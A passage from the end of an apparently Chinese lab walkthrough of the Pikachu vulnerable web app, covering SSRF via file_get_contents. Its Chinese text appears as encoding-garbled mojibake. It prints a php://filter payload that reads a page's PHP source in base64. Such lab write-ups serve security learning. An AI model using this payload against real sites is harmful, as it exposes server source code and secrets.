<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF( file_get_content )"></a>SSRF( file_get_content )</h2><p>1ã€ä¸ä¸Šä¸€ä¸ªæ–¹æ³•ç›¸åŒ</p>
<p>2ã€ä¹Ÿå¯ä»¥åˆ©ç”¨è¿™ä¸ªä¿®æ”¹fileå€¼è¯»å–åˆ°ç½‘é¡µæºç </p>
<p><code>payloadï¼š?file=php://filter/read=convert.base64-encode/resource=ssrf.php</code></p>
<p>ä¼šå‘ç°æºç ä»¥base64ç¼–ç çš„å½¢å¼å‡ºç°åœ¨äº†é¡µé¢ä¸‹è¾¹ï¼Œè¿›è¡Œè§£ç å³å¯çœ‹åˆ°æºç ï¼ˆå¤ªé•¿äº†å°±ä¸æ”¾äº†</p>
<hr>
<p>å†æ—¶3å¤©ç»ˆäºå®Œäº‹å„¿äº†ï¼Œä¸€ç›´æŠ½ç©ºåœ¨æè¿™ä¸ªï¼Œè€ƒè™‘æŠŠwebä»ä¸€ä¸ªå¤§æ¡†æ¶ä¸Šæ¥æ•´ä½“çœ‹ä¸€ä¸‹ï¼Œé‡æ–°å¼€å§‹æœ‰ç›®çš„çš„å»å­¦ä¸€ä¸‹ï¼Œé¶åœºå†…çš„éƒ½æ˜¯æ²¡æœ‰è¿‡æ»¤çš„ç®€å•çš„æ¼æ´å¤ç°ï¼Œè¿‡å‡ å¤©ä¼šæ‰¾ä¸€ä¸‹ç›¸å…³æ¯”èµ›é¢˜ç›®æ¥å¤ç°ä¸€ä¸‹ã€‚</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="mailto:undefined">T0mrvvi1b3t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://t0mrvvi1b3t.top/2021/05/18/pikachu/">http://t0mrvvi1b3t.top/2021/05/18/pikachu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="http://t0mrvvi1b3t.top" target="_blank">T0mrvvi1b3tâ€˜s blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://img.vim-cn.com/68/479ea06dd82108a050b701991f8405aa76bbbe.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/05/20/pico21/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1627968823542-1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">picoctf forensics</div></div></a></div><div class="next-post pull-right"><a href="/2021/05/15/ctfhub_.git/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1627968854214-3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">ctfhub æŠ€èƒ½æ ‘ .gitæ³„éœ²</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ss2.baidu.com/6ON1bjeh1BF3odCf/it/u=2706720867,592915881&amp;fm=27&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">T0mrvvi1b3t</div><div class="author-info__description">i have a big dream.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">20</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">13</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50597969"><i class="fab fa-csdn"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:t0mrvvi1b3t@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>å…¬å‘Š</span></div><div class="announcement_content">Nothing!!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">æš´åŠ›ç ´è§£</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">åŸºäºè¡¨å•çš„æš´åŠ›ç ´è§£</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">éªŒè¯ç ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#on-client"><span class="toc-number">1.2.1.</span> <span class="toc-text">on client</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#on-server"><span class="toc-number">1.2.2.</span> <span class="toc-text">on server</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-Site-Scripting-%E2%80%93-XSS"><span class="toc-number">2.</span> <span class="toc-text">Cross-Site Scripting â€“ XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-get"><span class="toc-number">2.1.</span> <span class="toc-text">åå°„å‹xss( get )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss-post"><span class="toc-number">2.2.</span> <span class="toc-text">åå°„å‹xss( post )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss"><span class="toc-number">2.3.</span> <span class="toc-text">å­˜å‚¨å‹xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss"><span class="toc-number">2.4.</span> <span class="toc-text">DOMå‹xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM%E5%9E%8Bxss-x"><span class="toc-number">2.5.</span> <span class="toc-text">DOMå‹xss-x</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">2.6.</span> <span class="toc-text">XSSä¹‹ç›²æ‰“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">2.7.</span> <span class="toc-text">XSSä¹‹è¿‡æ»¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bhtmlspecialchars"><span class="toc-number">2.8.</span> <span class="toc-text">XSSä¹‹htmlspecialchars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bhref%E8%BE%93%E5%87%BA"><span class="toc-number">2.9.</span> <span class="toc-text">XSSä¹‹hrefè¾“å‡º</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ejavascript%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9A"><span class="toc-number">2.9.1.</span> <span class="toc-text">å…³äºjavascriptä¼ªåè®®ï¼š</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="toc-number">2.10.</span> <span class="toc-text">XSSä¹‹jsè¾“å‡º</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">3.0.1.</span> <span class="toc-text">æ¦‚è¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.0.2.</span> <span class="toc-text">æ¢æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8EXSS%E5%8C%BA%E5%88%AB"><span class="toc-number">3.0.3.</span> <span class="toc-text">ä¸XSSåŒºåˆ«</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-get"><span class="toc-number">3.1.</span> <span class="toc-text">CSRF( get )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-post"><span class="toc-number">3.2.</span> <span class="toc-text">CSRF( post )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Token"><span class="toc-number">3.3.</span> <span class="toc-text">CSRF( Token )</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">3.3.1.</span> <span class="toc-text">é˜²èŒƒæªæ–½</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sql-Inject-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Sql Inject(SQLæ³¨å…¥)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5-post"><span class="toc-number">4.1.</span> <span class="toc-text">æ•°å­—å‹æ³¨å…¥( post )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5-get"><span class="toc-number">4.2.</span> <span class="toc-text">å­—ç¬¦å‹æ³¨å…¥( get )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">æœç´¢å‹æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xx%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">xxå‹æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#insert-updata%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">insert&#x2F;updataæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E5%85%A5updatexml%E5%87%BD%E6%95%B0"><span class="toc-number">4.5.1.</span> <span class="toc-text">å¼•å…¥updatexmlå‡½æ•°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">å‡½æ•°è§£é‡Šï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%8E%9F%E7%90%86"><span class="toc-number">4.5.1.2.</span> <span class="toc-text">æŠ¥é”™åŸç†</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.5.1.3.</span> <span class="toc-text">çº¦æŸæ¡ä»¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-number">4.5.1.4.</span> <span class="toc-text">æ³¨å…¥è¯­å¥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">4.5.1.5.</span> <span class="toc-text">å®æ“</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delete%E6%B3%A8%E5%85%A5"><span class="toc-number">4.6.</span> <span class="toc-text">deleteæ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-header%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.</span> <span class="toc-text">http headeræ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8User-Agent%E5%A4%84%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.1.</span> <span class="toc-text">åœ¨User-Agentå¤„æ³¨å…¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8Cookie%E5%A4%84%E6%B3%A8%E5%85%A5"><span class="toc-number">4.7.2.</span> <span class="toc-text">åœ¨Cookieå¤„æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.8.</span> <span class="toc-text">å¸ƒå°”ç›²æ³¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.9.</span> <span class="toc-text">æ—¶é—´ç›²æ³¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">4.10.</span> <span class="toc-text">å®½å­—èŠ‚æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE"><span class="toc-number">5.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="toc-number">5.1.</span> <span class="toc-text">exec â€œpingâ€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exec-%E2%80%9Ceval%E2%80%9D"><span class="toc-number">5.2.</span> <span class="toc-text">exec â€œevalâ€</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-inclusion-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">6.</span> <span class="toc-text">File inclusion( æ–‡ä»¶åŒ…å« )</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#File-inclusion-local"><span class="toc-number">6.1.</span> <span class="toc-text">File inclusion( local )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-inclusion-remote"><span class="toc-number">6.2.</span> <span class="toc-text">File inclusion( remote )</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsafe-filedownload"><span class="toc-number">7.</span> <span class="toc-text">Unsafe filedownload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Unsafe-fileupload"><span class="toc-number">8.</span> <span class="toc-text">Unsafe fileupload</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#client-check"><span class="toc-number">8.1.</span> <span class="toc-text">client check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mime-type"><span class="toc-number">8.2.</span> <span class="toc-text">Mime type</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getimagesize"><span class="toc-number">8.3.</span> <span class="toc-text">getimagesize</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Over-Permission"><span class="toc-number">9.</span> <span class="toc-text">Over Permission</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">9.1.</span> <span class="toc-text">æ°´å¹³è¶Šæƒ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">å‚ç›´è¶Šæƒ</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">10.</span> <span class="toc-text">..&#x2F;..&#x2F;( ç›®å½•éå† )</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">11.</span> <span class="toc-text">æ•æ„Ÿä¿¡æ¯æ³„éœ²</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#icanseeyourABC"><span class="toc-number">11.1.</span> <span class="toc-text">icanseeyourABC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">12.</span> <span class="toc-text">PHPååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">13.</span> <span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#URL%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">14.</span> <span class="toc-text">URLé‡å®šå‘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">15.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-curl"><span class="toc-number">15.1.</span> <span class="toc-text">SSRF( curl )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-file-get-content"><span class="toc-number">15.2.</span> <span class="toc-text">SSRF( file_get_content )</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/09/28/%E5%B8%B8%E8%A7%81%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A0%81/" title="æ— é¢˜"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1628069562539-3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æ— é¢˜"/></a><div class="content"><a class="title" href="/2021/09/28/%E5%B8%B8%E8%A7%81%E5%9B%BE%E5%BD%A2%E7%BC%96%E7%A0%81/" title="æ— é¢˜">æ— é¢˜</a><time datetime="2021-09-28T10:51:27.058Z" title="å‘è¡¨äº 2021-09-28 18:51:27">2021-09-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/11/rarctf/" title="rarctf"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1629196496400-1629196496398.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="rarctf"/></a><div class="content"><a class="title" href="/2021/08/11/rarctf/" title="rarctf">rarctf</a><time datetime="2021-08-11T06:05:28.116Z" title="å‘è¡¨äº 2021-08-11 14:05:28">2021-08-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/10/BSides%20Noida%20CTF%202021/" title="BSides Noida CTF 2021"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1629196280857-1629196280849.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BSides Noida CTF 2021"/></a><div class="content"><a class="title" href="/2021/08/10/BSides%20Noida%20CTF%202021/" title="BSides Noida CTF 2021">BSides Noida CTF 2021</a><time datetime="2021-08-10T10:10:59.758Z" title="å‘è¡¨äº 2021-08-10 18:10:59">2021-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/07/escapeshellarg/" title="escapeshellargé€ƒé€¸ä¸å‚æ•°æ³¨å…¥"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1628069561595-3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="escapeshellargé€ƒé€¸ä¸å‚æ•°æ³¨å…¥"/></a><div class="content"><a class="title" href="/2021/08/07/escapeshellarg/" title="escapeshellargé€ƒé€¸ä¸å‚æ•°æ³¨å…¥">escapeshellargé€ƒé€¸ä¸å‚æ•°æ³¨å…¥</a><time datetime="2021-08-07T06:05:45.549Z" title="å‘è¡¨äº 2021-08-07 14:05:45">2021-08-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="æµé‡åˆ†æ"><img src="https://cdn.jsdelivr.net/gh/hotzzzzy/img@main/1627968867847-5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="æµé‡åˆ†æ"/></a><div class="content"><a class="title" href="/2021/08/05/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="æµé‡åˆ†æ">æµé‡åˆ†æ</a><time datetime="2021-08-05T07:28:36.483Z" title="å‘è¡¨äº 2021-08-05 15:28:36">2021-08-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By T0mrvvi1b3t</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/"><span>è±«ICPå¤‡2021008961å·-1</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">æœ¬åœ°æœç´¢</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>